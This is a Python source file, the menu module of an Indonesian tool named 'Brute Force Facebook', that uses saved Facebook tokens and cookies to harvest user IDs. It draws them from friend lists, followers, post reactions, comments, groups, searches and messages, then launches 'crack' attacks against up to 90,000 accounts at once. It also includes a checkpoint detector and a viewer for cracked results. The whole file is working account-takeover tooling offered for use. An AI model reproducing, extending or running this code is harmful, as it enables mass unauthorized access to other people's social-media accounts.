# coding=utf-8 

#     *Brute Force Facebook (BFF)²
#     *file name: __init__.py
#     *copyright: (C) © 2022 ~ Romi Afrizal
#     *contact me on whatsap: +6281273018924

#     *Terimakasih sudah decode script ini tolong jangan di perjual belikan :)*
#     *Thanks for decoding this script, please don't sell it :)*
"""

-*- Author: Romi Afrizal  
}------------------------------------->
-*- Note: do not change again! there will be an error, the script is good                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        CODING BY GUWEH ROMI AFRIZAL :v
 
"""
#-------[ DO NOT CHANGE AGAIN ]-------#
from xyz import *
from log.masuk import romz_tzy as masuk
from romz.banner import Banner as rz
from romz import my_info as inpo
from romz import hasil as lihat
from .dump import romi_afrzl as dumpid 
from xyz import detect as detektor
#--- menu isntagram 
#from romz import insta as instagram 
 
sys.stdout.write('\x1b[1;35m\x1b]2; {×} bff-2 by romz {×} \x07')

#-------[ ORANG GANTENG ]-------#
class romz_xyz_ganteng_banget:

	def __init__(self):
		self.roomz = requests.Session()
		self.url_mb = "https://mbasic.facebook.com"
		self.hapus = "rm -rf data/token_eaab.txt && rm -rf token_eaag.txt && rm -rf data/cookie.txt"
		self.pepek = [
			"romi",
			"Romi",
			"ROMI",
			"Romi Afrizal",
			"romi afrizal",
			"Romi afrizal",
			"ROMI AFRIZAL",
			"romi Afrizal",""
		]
		self.Menu()

	#--- JALAN
	def jalan(self,keliling):
		for mau in keliling + '\n':
			sys.stdout.write(mau)
			sys.stdout.flush();jeda(0.03)

	#--- FOLDER
	def folder(self):
		try:os.mkdir('OK')
		except:pass
		try:os.mkdir('CP')
		except:pass
		try:os.mkdir('data')
		except:pass
		
	#--- WAKTU
	def waktu(self):
		jam = datetime.now().strftime("%X") # jam
		now = datetime.now()
		hours = now.hour
		if 00 <= hours < 11:sapa = "Selamat pagi"
		elif 11 <= hours < 15:sapa = "Selamat siang"
		elif 15 <= hours < 18:sapa = "Selamat sore"
		elif 18 <= hours < 23:sapa = "Selamat malam"
		else:sapa = "Selamat datang"
		return sapa
	
	#--- CONVERT COOKIE DICT TO STRING
	def romz_xyz(self,cookie,venom={}):
		for x in cookie.replace(' ','').strip().split(';'):
			kuki = x.split('=')
			if len(kuki) > 1:
				venom.update({kuki[0]: kuki[1]})
		return venom
		
	#--- MENU PILIHAN 
	def Menu(self):
		self.folder()
		rz().logo()
		try:
			self.tokenB = open("data/token_eaab.txt","r").read()
			self.tokenG = open("data/token_eaag.txt","r").read()
			self.kueh = open("data/cookie.txt","r").read()
			self.cokis = {"cookie":self.kueh}
			try:
				self.nama = self.roomz.get(f'https://graph.facebook.com/me?fields=name&access_token={self.tokenG}',cookies=self.cokis).json()["name"]
			except:
				self.get_url = self.roomz.get("https://mbasic.facebook.com/profile.php?v=info",cookies=self.romz_xyz(self.kueh)).text 
				self.nama = re.findall("\<title\>(.*?)<\/title\>",self.get_url)[0]
				if "Konten Tidak Ditemukan" in self.nama:
					os.system (self.hapus)
					exit ("%s╰─%s cookie invalid "%(p,m));jeda(2)
				else:
					pass
		except KeyError:
			os.system (self.hapus)
			exit ("%s╰─%s cookie kedaluwarsa "%(p,m));jeda(2)
		except FileNotFoundError:
			print ("%s╰─ %sanda belum login "%(p,m));jeda(2)
			os.system (self.hapus) 
			masuk()
		except (AttributeError,UnboundLocalError):
			os.system (self.hapus)
			exit ("%s╰─ %sterjadi kesalahan "%(p,m));jeda(2)
		except requests.exceptions.ConnectionError as konek:
			exit (f"%s╰─%s gagal memuat tidak ada koneksi: {konek}"%(p,m));jeda(2)
		tulis(Panel(f"""{Te}{P} # {O}{self.waktu()} {H}{self.nama} \n
 {U}•{P} 01 {O}Crack dari daftar teman           \n {U}•{P} 02 {O}Crack dari total pengikut    
 {U}•{P} 03 {O}Crack dari reaction post           \n {U}•{P} 04 {O}Crack dari komentar post     
 {U}•{P} 05 {O}Crack dari anggota group        \n {U}•{P} 06 {O}Crack dari halaman teman     
 {U}•{P} 07 {O}Crack dari pencarian nama     \n {U}•{P} 08 {O}Crack dari pesan masuk       
 {U}•{P} 09 {O}Crack dari cloning gmail          \n {U}•{P} 10 {O}Tools crack instagram      {H}pro
 {U}•{P} 11 {O}Menu tambahan               \n {U}•{M} 00 {O}Keluar  """,
		title = f'{Te}{M}[ {H}Menu {M}]',style='#FF0022'))
		slut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		if slut in['',' ']:
			exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				
		elif slut in['1','01']:
			if "accessTokenNotFound" in (self.tokenB,self.tokenG):
				try:
					dumpid(self.tokenB,self.tokenG,self.cokis).PublikCookie()
				except ValueError:
					exit()
			else:
				gan = input ("%s╰─%s anda ingin crack massal id? y/t%s >%s "%(p,o,m,k))
				if gan in['']:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				elif gan in['y','Y']:
					dumpid(self.tokenB,self.tokenG,self.cokis).MassalPublikGRAPH()
				elif gan in['t','T']:
					dumpid(self.tokenB,self.tokenG,self.cokis).PublikGRAPH()
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
							
		elif slut in['2','02']:
			if "accessTokenNotFound" in (self.tokenB,self.tokenG):
				try:
					dumpid(self.tokenB,self.tokenG,self.cokis).FollowCookie()
				except ValueError:
					exit() 
			else:
				dumpid(self.tokenB,self.tokenG,self.cokis).FollowPublikGRAPH()
					
		elif slut in['3','03']:
			tulis(Panel(f"{Te}{U} {til}{O} Pastikan postingan facebook publik ",style='#FF0022'))
			idt = input('%s╰─ %sID postingan %s> %s'%(p,o,m,k))
			if idt in[""," "]:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				try:
					dumpid(self.tokenB,self.tokenG,self.cokis).postingan(f"{self.url_mb}/ufi/reaction/profile/browser/?ft_ent_identifier={idt}")
				except KeyError:
					exit ('%s╰─%s gagal mengambil ID'%(p,m));jeda(2)
									
		elif slut in['4','04']:
			tulis(Panel(f"{Te}{U} {til}{O} Pastikan postingan facebook publik ",style='#FF0022'))
			idt = input('%s╰─ %sID postingan %s> %s'%(p,o,m,k))
			if idt in[""," "]:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				try:
					dumpid(self.tokenB,self.tokenG,self.cokis).komentar(f"{self.url_mb}/{idt}")
				except KeyError:
					exit ('%s╰─%s gagal mengambil ID, harap coba lagi'%(p,m));jeda(2)
									
		elif slut in['5','05']:
			tulis(Panel(f"{Te}{U} {til}{O} Pastikan group publik / anda bergabung dlm grup ",style='#FF0022'))
			idt = input('%s╰─ %sID group %s> %s'%(p,o,m,k))
			if idt in[""," "]:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				try:
					response = self.roomz.get(f"{self.url_mb}/browse/group/members/?id={idt}",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Halaman Tidak Ditemukan" in response:
						exit('%s╰─%s group tidak di temukan'%(p,m))
					elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
						exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					elif "Konten Tidak Ditemukan" in response:
						exit('%s╰─%s group tidak di temukan'%(p,m))
					else:
						#print (f"{p}╰─{o} Nama group {m}>{k} "+re.findall("\<title\>(.*?)<\/title\>",response)[0][8:])
						dumpid(self.tokenB,self.tokenG,self.cokis).groups(f"{self.url_mb}/browse/group/members/?id={idt}")
				except requests.exceptions.ConnectionError: 
					exit('%s╰─%s tidak ada koneksi%s\n'%(p,m,n))
								
		elif slut in['6','06']:
			tulis(Panel(f"""{Te} {U}•{P} 01 {O}Saran teman
 {U}•{P} 02 {O}Permintaan pertemanan
 {U}•{P} 03 {O}Permintaan terkirim """,
			title = f'{Te}{M}[ {H}Halaman teman {M}]',style='#FF0022'))
			tmn = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
			if tmn in['']:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			elif tmn in['1','01']:
				try:
					ajg = self.roomz.get(f"{self.url_mb}/friends/center/suggestions",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					else:
						jumlah=int(input('%s╰─ %sjumlah users %s> %s'%(p,o,m,k)))
						if "90000" in str(jumlah):
							jumlah-=1
						if jumlah<90001:
							dumpid(self.tokenB,self.tokenG,self.cokis).saran(f"{self.url_mb}/friends/center/suggestions",jumlah)
						else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
				except ValueError:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			elif tmn in['2','02']:
				try:
					ajg = self.roomz.get(f"{self.url_mb}/friends/center/requests",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					else:
						jumlah=int(input('%s╰─ %sjumlah user %s> %s'%(p,o,m,k)))
						if "90000" in str(jumlah):
							jumlah-=1
						if jumlah<90001:
							dumpid(self.tokenB,self.tokenG,self.cokis).tmann(f"{self.url_mb}/friends/center/requests",jumlah)
						else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
				except ValueError:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			elif tmn in['3','03']:
				try:
					ajg = self.roomz.get(f"{self.url_mb}/friends/center/requests/outgoing",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					else:
						jumlah=int(input('%s╰─ %sjumlah users %s> %s'%(p,o,m,k)))
						if "90000" in str(jumlah):
							jumlah-=1
						if jumlah<90001:
							dumpid(self.tokenB,self.tokenG,self.cokis).saran(f"{self.url_mb}/friends/center/requests/outgoing",jumlah)
						else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
				except ValueError:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
							
		elif slut in['7','07']:
			tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} romi{M},{O}doni gunakan koma ({M},{O}) untuk pemisah',style='#FF0022'))
			nm = input('%s╰─ %snama orang %s> %s'%(p,o,m,k)).split(",")
			if nm in self.pepek:
				exit ('%s╰─%s jangan pakai nama Romi deck'%(p,m));jeda(2)
			elif nm in ['']:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				try:
					for kontol in nm:
						ajg = self.roomz.get(f"{self.url_mb}/search/people/?q={kontol}",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
						if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
						elif "Anda Diblokir Sementara" in ajg:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
						else:
							jumlah=int(input('%s╰─ %sjumlah user %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.tokenB,self.tokenG,self.cokis).search_name(f"{self.url_mb}/public/{kontol}?/locale2=id_ID",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
				except ValueError:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
									
		elif slut in['8','08']:
			tulis(Panel(f"{Te}{U} {til}{O} Crack dari pesan massenger ",style='#FF0022'))
			try:
				dumpid(self.tokenB,self.tokenG,self.cokis).pesan(f"{self.url_mb}/messages")
			except KeyError:
				exit ('%s╰─%s gagal mengambil ID, harap coba lagi'%(p,m));jeda(2)
			except requests.exceptions.ConnectionError:
				exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
		
		elif slut in['9','09']:
			tulis(Panel(f'{Te}{U} •{O} masukan nama target, contoh{M} >{O} romi',style='#FF0022'))
			kontol = input('%s╰─ %snama orang %s> %s'%(p,o,m,k))
			if kontol in self.pepek:
				exit ('%s╰─%s jangan bodoh'%(p,m));jeda(2)
			else:
				try:
					jumlah=int(input('%s╰─ %sjumlah user %s> %s'%(p,o,m,k)))
					if "90000" in str(jumlah):
						jumlah-=1
					if jumlah<90001:
						dumpid(self.tokenB,self.tokenG,self.cokis).cloning_gmail(kontol,jumlah)
					else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
		
		elif slut in['10']:
			self.ComingSoon()
			#instagram.mengecek()
			
		elif slut in['11']:
			tulis(Panel(f""" {Te}{U}•{P} 01 {O}Checkpoint detektor     \n {U}•{P} 02 {O}Lihat hasil crack             
 {U}•{P} 03 {O}Bot share postingan              \n {U}•{P} 04 {O}Info tentang script    
 {U}•{P} rm {O}Hapus data login                \n {U}•{M} 00 {O}Kembali  """,
			style='#FF0022'))
			tam = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
			if tam in['',' ']:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			
			elif tam in['1','01']:
				detektor.file_cp()
			
			elif tam in['2','02']:
				lihat.hasil_fb()
				
			elif tam in['3','03']:
				self.ComingSoon()
				#share.post()
				
			elif tam in['4','04']:
				inpo.ingfoh()
				
			elif tam in['rm','RM','Rm']:
				os.system(self.hapus);print('')
				rz().loads()
				self.jalan('%s berhasil terhapus '%(m));exit()
				
			elif tam in['0','00']:
				os.system('python bff-2.py')
			
			else:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				
		elif slut in['0','00']:
			self.jalan('%s╰─%s Sampai jumpa tod :) '%(p,h));exit()

		else:
			exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			
	#--- BUAT PELENGKAP AJA :v
	def ComingSoon(self):
		self.jalan ("%s╰─ %sMenu belum tersedia... "%(p,o));exit()
	
"""

    Biar apa sih di decompile anyink
    Taekkk !
    
"""
